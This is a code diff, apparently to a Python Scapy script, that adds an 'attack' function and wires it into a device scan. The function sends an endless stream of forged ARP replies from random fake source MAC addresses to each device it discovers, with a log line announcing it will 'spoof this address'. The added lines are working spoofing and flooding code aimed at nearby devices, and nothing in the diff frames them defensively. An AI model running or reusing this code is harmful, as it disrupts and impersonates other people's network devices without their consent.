@@ -31,6 +31,14 @@ def calc_dist(dev, num):
             		print("[+] Count: " + str(count))
 
 		time.sleep(1)
+
+def attack(mac_id):
+	while 1:
+		dest_mac = mac_id
+		src_mac = RandMAC()
+		print("Faking Source MAC: %s", str(RandMAC()))
+		sendp(Ether(src=src_mac, dst=dest_mac)/ARP(op=2, psrc="0.0.0.0", hwsrc=src_mac, hwdst=dest_mac)/Padding(load="X"*18), verbose=1)
+		time.sleep(1)
 	
 
 def scan():
@@ -45,6 +53,7 @@ def scan():
 			calc_dist(str(device), 30)
 
 			print("Now we have distance... Let's spoof this address of %s", str(device))
+			attack(device)
 
 	else:
 			print("[-] No devices found syncing in your area.")
